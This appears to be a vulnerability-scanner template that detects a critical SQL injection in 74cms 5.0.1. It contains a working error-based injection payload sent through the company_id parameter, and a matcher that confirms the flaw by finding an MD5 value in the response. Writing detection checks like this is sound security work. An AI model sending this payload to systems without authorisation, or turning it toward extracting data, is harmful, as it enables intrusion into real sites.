id: 74cms-sqli
brief:
    title: 74cms Sql Injection
    by: princechaddha
    level: critical
    about: A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.
    label:
        - 74cms
        - sqli
        - vuln
    score: CVSS:9.8
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a'
      signs:
        - "on": word
          has:
            - '{{md5({{num}})}}'
          in: body
